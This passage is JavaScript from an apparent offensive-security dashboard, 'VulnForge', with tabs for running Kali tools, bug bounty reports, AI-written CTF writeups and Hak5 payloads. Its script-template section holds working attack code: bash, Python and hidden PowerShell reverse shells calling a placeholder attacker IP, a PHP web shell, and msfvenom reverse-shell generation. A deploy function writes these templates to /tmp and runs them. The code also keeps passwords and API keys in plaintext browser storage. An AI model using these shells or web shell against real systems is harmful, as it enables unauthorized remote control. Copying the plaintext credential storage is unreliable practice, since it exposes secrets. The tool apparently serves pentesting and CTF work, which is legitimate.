        if (extraFlags && tool !== 'cewl' && !description.includes('guide') && !description.includes('Guide') && !description.includes('Usage')) {
            // For tools with a direct target, insert flags before target
            // For others, append at end
            if (command.includes('${target}') && command.indexOf('${target}') > 10) {
                finalCommand = command.replace(/\$\{target\}/, `${extraFlags} ${target}`);
            } else {
                finalCommand = `${command} ${extraFlags}`;
            }
        }

        const sep = '─'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 ${description}`);
        appendOutput(`  🎯 ${target || '(no target needed)'}`);
        if (extraFlags) appendOutput(`  🚩 extra: ${extraFlags}`);
        appendOutput(`  \$ ${finalCommand}`);
        appendOutput(`${sep}`);

        window.sendPredefinedCmd(finalCommand);

        // Auto-focus extra flags for next use
        document.getElementById('extra-flags').focus();
    };

    // ── Delegate tool button events for extra-flags hints ──
    document.addEventListener('mouseover', function (e) {
        const btn = e.target.closest('[onclick*=\"launchTool\"]');
        if (btn) {
            const match = btn.getAttribute('onclick').match(/launchTool\('(\w+)'\)/);
            if (match) {
                const toolId = match[1];
                const exampleText = document.getElementById('extra-flags-example-text');
                const exampleDiv = document.getElementById('extra-flags-example');
                const hint = document.getElementById('extra-flags-hint');
                const ex = toolExamples[toolId];
                if (ex) {
                    exampleText.textContent = ex;
                    exampleDiv.classList.remove('hidden');
                    hint.textContent = toolId;
                }
            }
        }
    });

    // ── Clear hint when mouse leaves the sidebar ──
    document.getElementById('sidebar').addEventListener('mouseleave', function () {
        // Only clear if the extra flags input isn't focused
        if (document.activeElement !== document.getElementById('extra-flags')) {
            const exampleDiv = document.getElementById('extra-flags-example');
            const hint = document.getElementById('extra-flags-hint');
            // Keep the last example visible but dim it
            hint.textContent = 'hover a tool';
        }
    });

    // ============================================================
    //  TAB SYSTEM
    // ============================================================
    window.switchTab = function (tabName) {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));

        const btns = document.querySelectorAll('.tab-btn');
        const panes = {
            terminal: 0,
            reports: 1,
            scripts: 2,
            bounty: 3,
            aiwriteup: 4,
            hak5: 5,
            automation: 6
        };
        if (panes[tabName] !== undefined) {
            btns[panes[tabName]].classList.add('active');
        }
        const el = document.getElementById(`tab-${tabName}`);
        if (el) el.classList.add('active');
    };

    // ============================================================
    //  CATEGORY TOGGLE
    // ============================================================
    window.toggleCategory = function (header) {
        const body = header.nextElementSibling;
        const arrow = header.querySelector('span:first-child');
        if (body.style.display === 'none') {
            body.style.display = '';
            arrow.textContent = '▶';
        } else {
            body.style.display = 'none';
            arrow.textContent = '▼';
        }
    };

    // ============================================================
    //  SCRIPT BUILDER — Templates
    // ============================================================
    const SCRIPT_TEMPLATES = {
        'blank': { lang: 'bash', content: '#!/bin/bash\n\n# Your payload here\n' },

        'bash-rev': { lang: 'bash', content: `#!/bin/bash
# Bash Reverse Shell
# Usage: ./script.sh <LHOST> <LPORT>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
` },

        'python-rev': { lang: 'python', content: `#!/usr/bin/env python3
# Python3 Reverse Shell
# Usage: python3 script.py <LHOST> <LPORT>

import sys, socket, subprocess, os

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.x"
LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
` },

        'php-webshell': { lang: 'php', content: `<?php
// PHP WebShell
// Upload to target and access: http://target/shell.php?cmd=whoami

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>` },

        'powershell-rev': { lang: 'powershell', content: `# PowerShell Reverse Shell
# Run: powershell -NoP -NonI -W Hidden -Exec Bypass -f script.ps1

$LHOST = "10.10.14.x"
$LPORT = 4444

$c = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS " + (pwd).Path + "> ";
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}
$c.Close()
` },

        'msfvenom': { lang: 'bash', content: `#!/bin/bash
# Msfvenom Payload Generator
# Usage: ./gen.sh <LHOST> <LPORT> <TYPE>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"
TYPE="\${3:-linux}"

case $TYPE in
    linux)
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev_shell.elf
        ;;
    windows)
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev_shell.exe
        ;;
    php)
        msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.php
        ;;
    python)
        msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.py
        ;;
    *)
        echo "Usage: \$0 <LHOST> <LPORT> <linux|windows|php|python>"
        ;;
esac
echo "[+] Payload generated: rev_shell.\$TYPE"
` }
    };

    let savedScripts = [];

    function loadSavedScripts() {
        try {
            const stored = localStorage.getItem('vulnforge_scripts');
            savedScripts = stored ? JSON.parse(stored) : [];
        } catch { savedScripts = []; }
    }

    function saveSavedScripts() {
        localStorage.setItem('vulnforge_scripts', JSON.stringify(savedScripts));
    }

    window.selectScriptTemplate = function (name) {
        // Update active button
        document.querySelectorAll('.script-template-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');

        const tmpl = SCRIPT_TEMPLATES[name];
        if (tmpl) {
            scriptEditor.value = tmpl.content;
            document.getElementById('script-lang').textContent = tmpl.lang;
            document.getElementById('script-line-count').textContent =
                tmpl.content.split('\n').length + ' lines';
            if (!scriptName.value) scriptName.value = name + '.sh';
        }
    };

    window.deployScript = function () {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return;
        }

        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'payload.sh';
        if (!content) {
            alert('⚠️  Script editor is empty.');
            return;
        }

        // Show deploy log
        deployLog.classList.remove('hidden');
        deployLogText.textContent = '';

        // Escape content for SSH echo
        const escaped = content
            .replace(/\\/g, '\\\\')
            .replace(/`/g, '\\`')
            .replace(/\$/g, '\\$')
            .replace(/"/g, '\\"');

        // Write to file on Kali, make executable, and run
        const cmd = `echo "${escaped}" > /tmp/${name} && chmod +x /tmp/${name} && echo "[+] Written to /tmp/${name}"`;

        deployLogText.textContent += `> Writing script to /tmp/${name}...\n`;
        appendOutput(`\n[*] Deploying script: ${name}`);

        // First write
        ws.send(cmd);

        // Ask if execute
        setTimeout(() => {
            if (confirm(`🚀 Script written to /tmp/${name}.\n\nExecute it now?`)) {
                const execCmd = `cd /tmp && ./${name}`;
                deployLogText.textContent += `> Executing: ${execCmd}\n`;
                appendOutput(`[*] Executing: ${execCmd}`);
                ws.send(execCmd);
            } else {
                deployLogText.textContent += `> Ready at /tmp/${name}\n`;
                appendOutput(`[*] Script saved to /tmp/${name} (not executed)`);
            }
        }, 500);

        showToast(`⬆ Script "${name}" deployed`);
    };

    window.saveScript = function () {
        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'untitled.sh';
        if (!content) {
            alert('⚠️  Editor is empty.');
            return;
        }
        // Avoid duplicates
        const idx = savedScripts.findIndex(s => s.name === name);
        if (idx >= 0) savedScripts[idx].content = content;
        else savedScripts.push({ name, content, saved: new Date().toLocaleString() });

        saveSavedScripts();
        document.getElementById('script-status').textContent = `✓ saved "${name}"`;
        showToast(`💾 Script "${name}" saved locally`);
    };

    window.loadScript = function () {
        if (savedScripts.length === 0) {
            alert('📂 No saved scripts found.');
            return;
        }
        const list = savedScripts.map((s, i) => `${i + 1}. ${s.name} (${s.saved})`).join('\n');
        const choice = prompt(`📂 Saved scripts:\n\n${list}\n\nEnter number to load:`);
        const idx = parseInt(choice) - 1;
        if (idx >= 0 && idx < savedScripts.length) {
            const s = savedScripts[idx];
            scriptEditor.value = s.content;
            scriptName.value = s.name;
            document.getElementById('script-line-count').textContent = s.content.split('\n').length + ' lines';
            document.getElementById('script-status').textContent = `📂 loaded "${s.name}"`;
            showToast(`📂 Loaded "${s.name}"`);
        }
    };

    // Update line count on edit
    scriptEditor.addEventListener('input', () => {
        document.getElementById('script-line-count').textContent =
            (scriptEditor.value.match(/\n/g) || []).length + 1 + ' lines';
    });

    // ============================================================
    //  BOUNTY REPORT GENERATOR
    // ============================================================
    let lastBountyReport = '';

    window.generateBountyReport = function () {
        const target      = document.getElementById('bounty-target').value.trim();
        const vulnType    = document.getElementById('bounty-type').value;
        const severity    = document.getElementById('bounty-severity').value;
        const component   = document.getElementById('bounty-component').value.trim();
        const description = document.getElementById('bounty-description').value.trim();
        const steps       = document.getElementById('bounty-steps').value.trim();
        const impact      = document.getElementById('bounty-impact').value.trim();
        const poc         = document.getElementById('bounty-poc').value.trim();
        const fix         = document.getElementById('bounty-fix').value.trim();

        if (!target) { alert('⚠️  Enter a target URL/IP'); return; }
        if (!description) { alert('⚠️  Enter a description'); return; }

        const date = new Date().toISOString().split('T')[0];
        const sevEmoji = { Critical: '🔴', High: '🟠', Medium: '🟡', Low: '🔵', Info: '⚪' };

        const report = `# 🛡️ Bug Bounty Report

**Target:** \`${target}\`
**Date:** ${date}
**Vulnerability:** ${vulnType}
**Severity:** ${sevEmoji[severity] || '•'} **${severity}**
**Reporter:** VulnForge Dashboard

---

## 📋 Summary

${description}

## 🎯 Affected Component

\`${component || 'N/A'}\`

## 🔄 Steps to Reproduce

${steps || '1. Navigate to the target\n2. Perform the attack\n3. Observe the vulnerability'}

## 💥 Impact

${impact || 'An attacker could exploit this vulnerability to compromise the target system.'}

## 🧪 Proof of Concept

\`\`\`
${poc || 'See attached files or URLs'}
\`\`\`

## 🔧 Recommendation

${fix || 'Apply appropriate security patches and input validation.'}

---

*Report generated by **VulnForge** — ${date}*
`;

        lastBountyReport = report;
        document.getElementById('bounty-preview').textContent = report;
        document.getElementById('btn-download-bounty').disabled = false;
        showToast('📋 Bounty report generated');
    };

    // ============================================================
    //  EXPORT UTILITIES (MD / HTML / PDF)
    // ============================================================

    /**
     * Convert markdown-like text to basic HTML for export.
     */
    function mdToBasicHTML(text) {
        if (!text) return '<p>No content</p>';
        let html = text
            // Escape HTML entities first
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            // Code blocks (```...```)
            .replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>')
            // Inline code
            .replace(/`([^`]+)`/g, '<code>$1</code>')
            // Headers
            .replace(/^### (.+)$/gm, '<h3>$1</h3>')
            .replace(/^## (.+)$/gm, '<h2>$1</h2>')
            .replace(/^# (.+)$/gm, '<h1>$1</h1>')
            // Bold / italic
            .replace(/\*\*(\S[^*]+)\*\*/g, '<strong>$1</strong>')
            .replace(/\*(\S[^*]+)\*/g, '<em>$1</em>')
            // Links
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
            // Horizontal rules
            .replace(/^---$/gm, '<hr>')
            // List items
            .replace(/^- (.+)$/gm, '<li>$1</li>')
            // Line breaks
            .replace(/\n\n/g, '</p><p>')
            .replace(/\n/g, '<br>');
        return '<p>' + html + '</p>';
    }

    /**
     * Build a complete, self-contained HTML document for export or print preview.
     * @param {string}  content   - Raw markdown-like report text
     * @param {string}  title     - Document title
     * @param {string}  type      - 'bounty' | 'writeup' | 'scan'
     * @returns {string} Full HTML page
     */
    function buildExportHTML(content, title, type) {
        const bodyHtml = mdToBasicHTML(content);
        const date = new Date().toISOString().split('T')[0];
        return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title} — VulnForge</title>
<style>
  :root {
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #e6edf3; --text-dim: #8b949e; --accent: #58a6ff;
    --accent2: #3fb950; --font: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    --mono: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: var(--bg); color: var(--text); font-family: var(--font);
    padding: 40px 48px; line-height: 1.7; font-size: 14px;
  }
  .header {
    border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 24px;
    display: flex; align-items: center; justify-content: space-between;
  }
  .header h1 { font-size: 20px; font-weight: 700; color: var(--accent); }
  .header .meta { font-size: 12px; color: var(--text-dim); font-family: var(--mono); }
  .footer {
    margin-top: 40px; padding-top: 16px; border-top: 1px solid var(--border);
    font-size: 11px; color: var(--text-dim); text-align: center;
  }
  h1, h2, h3, h4 { color: var(--accent); margin: 20px 0 8px; font-weight: 600; }
  h1 { font-size: 22px; }
  h2 { font-size: 18px; border-bottom: 1px solid var(--border); padding-bottom: 4px; }
  h3 { font-size: 15px; }
  p { margin: 8px 0; }
  a { color: var(--accent); text-decoration: underline; }
  pre, code { font-family: var(--mono); background: var(--surface); border-radius: 4px; }
  code { padding: 1px 5px; font-size: 13px; }
  pre { padding: 12px 16px; overflow-x: auto; margin: 12px 0; border: 1px solid var(--border); font-size: 13px; line-height: 1.5; }
  pre code { padding: 0; background: none; }
  hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
  li { margin: 4px 0 4px 20px; }
  strong { color: #f0f6fc; }
  @media print {
    body { background: #fff; color: #000; padding: 20px; }
    .header h1 { color: #1f6feb; }
    h1, h2, h3 { color: #1f6feb; }
    pre, code { background: #f6f8fa; border-color: #d0d7de; }
    a { color: #1f6feb; }
    strong { color: #000; }
    .footer { color: #6e7681; }
    @page { margin: 15mm; }
  }
</style>
</head>
<body>
  <div class="header">
    <h1>${title}</h1>
    <div class="meta">${date} · VulnForge</div>
  </div>
  ${bodyHtml}
  <div class="footer">
    Generated by <strong>VulnForge</strong> — ${date}
  </div>
</body>
</html>`;
    }

    /**
     * Open a print-friendly popup window for PDF export.
     * User chooses "Save as PDF" in the print dialog.
     */
    function openPDFPreview(htmlContent, title) {
        const win = window.open('', '_blank', 'width=900,height=700,scrollbars=yes');
        if (!win) {
            showToast('⚠️ Popup blocked — allow popups for PDF export');
            return;
        }
        win.document.write(htmlContent);
        win.document.title = title;
        win.document.close();
        win.focus();
        // Wait for fonts/images then print
        setTimeout(() => {
            win.print();
        }, 500);
    }

    /**
     * Generic file download using Blob.
     */
    function downloadString(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType + ';charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        URL.revokeObjectURL(url);
    }

    /**
     * Export a raw report string as MD / HTML / PDF.
     * @param {string} content   - Raw markdown-like text
     * @param {string} filename  - Base filename (no extension)
     * @param {string} format    - 'md' | 'html' | 'pdf'
     * @param {string} title     - Pretty title for the report
     * @param {string} type      - 'bounty' | 'writeup' | 'scan'
     */
    function exportReport(content, filename, format, title, type) {
        const date = new Date().toISOString().split('T')[0];
        const safeName = filename.replace(/[^a-zA-Z0-9_-]/g, '_') || 'report';

        switch (format) {
            case 'md':
                downloadString(content, `${safeName}-${date}.md`, 'text/markdown');
                break;
            case 'html': {
                const html = buildExportHTML(content, title, type);
                downloadString(html, `${safeName}-${date}.html`, 'text/html');
                break;
            }
            case 'pdf': {
                const html = buildExportHTML(content, title, type);
                openPDFPreview(html, `${title} — ${date}`);
                break;
            }
        }
        showToast(`⬇ ${format.toUpperCase()} exported`);
    }

    // ── Updated Bounty Download ──
    window.downloadBountyReport = function () {
        if (!lastBountyReport) return;
        const target = document.getElementById('bounty-target').value.trim().replace(/[^a-zA-Z0-9]/g, '_') || 'report';
        const format = document.getElementById('bounty-format').value;
        const vulnType = document.getElementById('bounty-type').value;
        exportReport(lastBountyReport, `bug-bounty-${target}`, format, `Bug Bounty — ${vulnType}`, 'bounty');
    };

    // ── Updated AI Writeup Download ──
    window.downloadAIWriteup = function () {
        if (!lastAIWriteup) return;
        const machine = document.getElementById('ai-machine').value.trim().replace(/[^a-zA-Z0-9_-]/g, '_') || 'writeup';
        const format = document.getElementById('ai-format').value;
        exportReport(lastAIWriteup, `writeup-${machine}`, format, `Writeup — ${machine}`, 'writeup');
    };

    // ── Export single scan report ──
    window.exportScanReport = function (index, format) {
        const r = window.reports && window.reports[index];
        if (!r) { showToast('⚠️ Report not found'); return; }

        // Build a text report from the structured data
        let content = `# ${r.type.toUpperCase()} Scan Report\n\n`;
        content += `**Target:** \`${r.target}\`\n`;
        content += `**Date:** ${r.timestamp}\n`;
        content += `**Tool:** ${r.type}\n\n`;
        content += `---\n\n`;

        if (r.type === 'nmap' && r.ports) {
            content += `## Open Ports (${r.ports.length})\n\n`;
            content += `| Port | Protocol | Service | Version |\n`;
            content += `|------|----------|---------|--------|\n`;
            r.ports.forEach(p => {
                content += `| ${p.port} | ${p.protocol || 'tcp'} | ${p.service || '?'} | ${p.version || '-'} |\n`;
            });
            if (r.os) content += `\n**OS:** ${r.os}\n`;
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else if (r.type === 'gobuster' && r.dirs) {
            content += `## Found Directories (${r.dirs.length})\n\n`;
            r.dirs.forEach(d => {
                content += `- [${d.status}] ${d.path}${d.size ? ` (${d.size})` : ''}\n`;
            });
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else {
            content += r.raw || 'No data';
        }

        const title = `${r.type.toUpperCase()} — ${r.target}`;
        exportReport(content, `${r.type}-${r.target.replace(/[^a-zA-Z0-9]/g, '_')}`, format, title, 'scan');
    };

    // ── Export all scan reports ──
    window.exportAllReports = function () {
        const arr = window.reports || [];
        if (arr.length === 0) { showToast('⚠️ No reports to export'); return; }
        const format = document.getElementById('reports-format').value;

        // Build a compiled report document
        let content = `# VulnForge — Scan Reports Compilation\n\n`;
        content += `**Date:** ${new Date().toISOString().split('T')[0]}\n`;
        content += `**Total Reports:** ${arr.length}\n\n`;
        content += `---\n\n`;

        arr.forEach((r, i) => {
            content += `## ${i+1}. ${r.type.toUpperCase()} › ${r.target}\n\n`;
            content += `**Time:** ${r.timestamp}\n\n`;

            if (r.type === 'nmap' && r.ports) {
                content += `**Open Ports:** ${r.ports.length}\n\n`;
                r.ports.forEach(p => {
                    content += `- \`${p.port}/${p.protocol || 'tcp'}\` — ${p.service || '?'} ${p.version ? `(${p.version})` : ''}\n`;
                });
                if (r.os) content += `\n**OS Guess:** ${r.os}\n`;
            } else if (r.type === 'gobuster' && r.dirs) {
                content += `**Found:** ${r.dirs.length} directories\n\n`;
                r.dirs.forEach(d => {
                    content += `- [${d.status}] ${d.path}\n`;
                });
            } else {
                content += `\`\`\`\n${(r.raw || 'No data').substring(0, 1000)}\n\`\`\`\n`;
            }
            content += `\n---\n\n`;
        });

        const title = `All Reports — VulnForge`;
        exportReport(content, `all-reports-${new Date().toISOString().split('T')[0]}`, format, title, 'scan');
    };

    // ============================================================
    //  AI WRITEUP GENERATOR
    // ============================================================
    let lastAIWriteup = '';

    // Load saved API config
    function loadAIConfig() {
        try {
            const ep = localStorage.getItem('vulnforge_ai_endpoint');
            const key = localStorage.getItem('vulnforge_ai_key');
            const model = localStorage.getItem('vulnforge_ai_model');
            if (ep) document.getElementById('ai-endpoint').value = ep;
            if (key) document.getElementById('ai-key').value = key;
            if (model) document.getElementById('ai-model').value = model;
        } catch {}
    }

    function saveAIConfig() {
        try {
            localStorage.setItem('vulnforge_ai_endpoint', document.getElementById('ai-endpoint').value);
            localStorage.setItem('vulnforge_ai_key', document.getElementById('ai-key').value);
            localStorage.setItem('vulnforge_ai_model', document.getElementById('ai-model').value);
        } catch {}
    }

    window.generateAIWriteup = async function () {
        const endpoint = document.getElementById('ai-endpoint').value.trim();
        const apiKey   = document.getElementById('ai-key').value.trim();
        const model    = document.getElementById('ai-model').value.trim() || 'gpt-4';
        const machine  = document.getElementById('ai-machine').value.trim();
        const findings = document.getElementById('ai-findings').value.trim();
        const steps    = document.getElementById('ai-steps').value.trim();
        const flags    = document.getElementById('ai-flags').value.trim();

        if (!apiKey) { alert('⚠️  Enter your API key in the configuration section'); return; }
        if (!machine) { alert('⚠️  Enter the machine/target name'); return; }
        if (!findings) { alert('⚠️  Enter at least some findings'); return; }

        saveAIConfig();

        const status = document.getElementById('ai-status');
        const output = document.getElementById('ai-output');
        const btnGen = document.querySelector('#tab-aiwriteup .bg-neon\\/10');
        status.classList.remove('hidden');
        status.innerHTML = '⏳ Generating writeup... <span class="ai-status-dot ml-1"></span>';
        output.textContent = 'Generating...';
        if (btnGen) btnGen.disabled = true;

        const prompt = `You are a professional penetration tester writing a CTF machine writeup. Write a detailed, well-structured writeup in Markdown format.

Machine: ${machine}
${flags ? `Flags: ${flags}` : ''}

## Key Findings
${findings}

## Steps Taken
${steps || 'See findings above'}

Generate a complete writeup with:
1. **Reconnaissance** - Nmap, Gobuster, etc. findings
2. **Enumeration** - Detailed analysis of services found
3. **Exploitation** - Step-by-step with commands and explanations
4. **Privilege Escalation** - How root/admin was obtained
5. **Flags** - user.txt and root.txt
6. **Lessons Learned** - Key takeaways

Use markdown formatting with code blocks for commands. Be thorough and technical.`;

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: model,
                    messages: [
                        { role: 'system', content: 'You are a professional CTF writeup author. Write detailed, technical Markdown writeups.' },
                        { role: 'user', content: prompt }
                    ],
                    temperature: 0.7,
                    max_tokens: 4000
                })
            });

            if (!response.ok) {
                const errText = await response.text();
                throw new Error(`API error ${response.status}: ${errText}`);
            }

            const data = await response.json();
            let content = '';
            if (data.choices && data.choices[0] && data.choices[0].message) {
                content = data.choices[0].message.content;
            } else if (data.response) {
                content = data.response;
            } else {
                content = JSON.stringify(data, null, 2);
            }

            lastAIWriteup = content;
            output.textContent = content;
            document.getElementById('btn-download-ai').disabled = false;
            showToast('🤖 Writeup generated successfully');
        } catch (err) {
            output.textContent = `[!] Error: ${err.message}`;
            showToast(`⚠️ AI generation failed: ${err.message}`);
        } finally {
            status.classList.add('hidden');
            if (btnGen) btnGen.disabled = false;
        }
    };

    // ============================================================
    //  HAK5 PAYLOAD EDITOR
    // ============================================================
    const hak5Devices = {
        bunny:  { name: 'Bash Bunny',      icon: '🐰', ext: 'txt', lang: 'ducky script', desc: 'USB Rubber Ducky-style HID attacks' },
        omg:    { name: 'OMG Cable',       icon: '🔌', ext: 'js',  lang: 'javascript',    desc: 'WiFi-enabled drop cable payloads' },
        m5:     { name: 'M5 Stack',        icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
        shack:  { name: 'Shack Jack',      icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' }
    };
    let currentHak5Device = 'bunny';

    function getHak5StorageKey() {
        return `vulnforge_hak5_${currentHak5Device}`;
    }

    function getHak5Payloads() {
        try {
            return JSON.parse(localStorage.getItem(getHak5StorageKey()) || '[]');
        } catch { return []; }
    }

    function setHak5Payloads(arr) {
        localStorage.setItem(getHak5StorageKey(), JSON.stringify(arr));
        updateHak5SavedCount();
    }

    function updateHak5SavedCount() {
        const count = getHak5Payloads().length;
        document.getElementById('hak5-saved-count').textContent = count;
    }

    window.switchHak5Device = function (deviceId) {
        currentHak5Device = deviceId;
        const dev = hak5Devices[deviceId];
        if (!dev) return;

        // Update tabs
        document.querySelectorAll('.hak5-device-btn').forEach(b => b.classList.remove('active'));
        document.querySelector(`.hak5-device-btn[data-device="${deviceId}"]`)?.classList.add('active');

        // Update UI
        document.getElementById('hak5-device-name').textContent = dev.name;
        document.getElementById('hak5-device-icon').textContent = dev.icon;
        document.getElementById('hak5-device-desc').textContent = dev.desc;
        document.getElementById('hak5-lang').textContent = dev.lang;
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '';
        updateHak5SavedCount();
        showToast(`🔌 Switched to ${dev.name}`);
    };

    window.saveHak5Payload = function () {
        const dev = hak5Devices[currentHak5Device];
        const name = document.getElementById('hak5-payload-name').value.trim();
        const code = document.getElementById('hak5-editor').value.trim();
        if (!name) { showToast('⚠️ Enter a payload name'); return; }
        if (!code) { showToast('⚠️ Enter payload code'); return; }

        const payloads = getHak5Payloads();
        const filename = name.endsWith(`.${dev.ext}`) ? name : `${name}.${dev.ext}`;

        // Update if exists, else add
        const idx = payloads.findIndex(p => p.name === filename);
        if (idx >= 0) {
            payloads[idx].code = code;
            payloads[idx].updated = new Date().toISOString();
            showToast(`💾 Updated "${filename}"`);
        } else {
            payloads.push({ name: filename, code, device: currentHak5Device, created: new Date().toISOString(), updated: new Date().toISOString() });
            showToast(`💾 Saved "${filename}"`);
        }
        setHak5Payloads(payloads);
    };

    window.loadHak5Payload = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) { showToast('📂 No saved payloads'); return; }

        // Build a simple select prompt
        const names = payloads.map((p, i) => `${i+1}. ${p.name}`).join('\n');
        const input = prompt(`Saved payloads for ${hak5Devices[currentHak5Device].name}:\n\n${names}\n\nEnter number to load:`);
        if (!input) return;
        const idx = parseInt(input) - 1;
        if (idx < 0 || idx >= payloads.length) { showToast('⚠️ Invalid selection'); return; }

        document.getElementById('hak5-editor').value = payloads[idx].code;
        document.getElementById('hak5-payload-name').value = payloads[idx].name;
        document.getElementById('hak5-payload-status').textContent = `📂 loaded "${payloads[idx].name}"`;
        showToast(`📂 Loaded "${payloads[idx].name}"`);
    };

    window.listHak5Payloads = function () {
        const payloads = getHak5Payloads();
        if (payloads.length === 0) {
            showToast('📋 No saved payloads for this device');
            return;
        }
        // Show in terminal-like output in status
        const list = payloads.map((p, i) => `${i+1}. ${p.name}`).join(' · ');
        document.getElementById('hak5-payload-status').textContent = `📋 ${payloads.length} payloads: ${list}`;
        showToast(`📋 ${payloads.length} payloads for ${hak5Devices[currentHak5Device].name}`);
    };

    window.clearHak5Editor = function () {
        document.getElementById('hak5-editor').value = '';
        document.getElementById('hak5-payload-name').value = '';
        document.getElementById('hak5-payload-status').textContent = '✕ cleared';
        showToast('✕ Editor cleared');
    };

    // Update line count on edit (deferred until DOM ready)
    const initHak5 = () => {
        const hak5Editor = document.getElementById('hak5-editor');
        if (hak5Editor) {
            hak5Editor.addEventListener('input', () => {
                document.getElementById('hak5-line-count').textContent =
                    (hak5Editor.value.match(/\n/g) || []).length + 1 + ' lines';
            });
        }
        updateHak5SavedCount();
    };
    // Run now (DOM is already loaded at this point since we're inside DOMContentLoaded)
    initHak5();

    // ============================================================
    //  PAYLOAD STUDIO CONNECTION
    // ============================================================
    function getPSCreds() {
        try { return JSON.parse(localStorage.getItem('vulnforge_ps_creds') || 'null'); } catch { return null; }
    }

    function setPSCreds(creds) {
        localStorage.setItem('vulnforge_ps_creds', JSON.stringify(creds));
    }

    function clearPSCreds() {
        localStorage.removeItem('vulnforge_ps_creds');
    }

    function updatePSStatus(connected) {
        const badge = document.getElementById('ps-status-badge');
        const form  = document.getElementById('ps-connect-form');
        const btnConnect = document.getElementById('btn-connect-ps');
        const btnDisconnect = document.getElementById('btn-disconnect-ps');
        if (!badge) return;

        if (connected) {
            badge.innerHTML = '🟢 connected';
            badge.className = 'text-[9px] text-neon border border-neon/30 rounded px-2 py-0.5';
            if (form) form.style.display = 'none';
            if (btnConnect) btnConnect.style.display = 'none';
            if (btnDisconnect) btnDisconnect.style.display = 'inline-block';
        } else {
            badge.innerHTML = '⚪ disconnected';
            badge.className = 'text-[9px] text-gray-700 border border-gray-800 rounded px-2 py-0.5';
            if (form) form.style.display = 'block';
            if (btnConnect) btnConnect.style.display = 'inline-block';
            if (btnDisconnect) btnDisconnect.style.display = 'none';
        }
    }

    window.connectPayloadStudio = function () {
        const form = document.getElementById('ps-connect-form');
        if (form) form.style.display = form.style.display === 'none' ? 'block' : 'block';
        // If already have saved creds, try auto-login
        const saved = getPSCreds();
        if (saved) {
            document.getElementById('ps-email').value = saved.email || '';
            document.getElementById('ps-password').value = saved.password || '';
            showToast('🔌 Credentials loaded — click Sign In');
        }
    };

    window.disconnectPayloadStudio = function () {
        clearPSCreds();
        updatePSStatus(false);
        // Reload iframe back to login
        const iframe = document.getElementById('ps-iframe');
        if (iframe) iframe.src = 'https://payloadstudio.hak5.org/login/';
        showToast('⚡ Payload Studio disconnected');
    };

    window.doPayloadStudioLogin = function () {
        const email = document.getElementById('ps-email').value.trim();
        const password = document.getElementById('ps-password').value.trim();
        if (!email || !password) {
            showToast('⚠️ Enter email and password');
            return;
        }

        // Store creds locally
        setPSCreds({ email, password, savedAt: new Date().toISOString() });
        updatePSStatus(true);

        // Navigate the iframe to the main Payload Studio app (post-login)
        const iframe = document.getElementById('ps-iframe');
        if (iframe) iframe.src = 'https://payloadstudio.hak5.org/';
        showToast('🔌 Connected to Payload Studio');
    };

    // Restore saved session on load
    function restorePSSession() {
        const saved = getPSCreds();
        if (saved) {
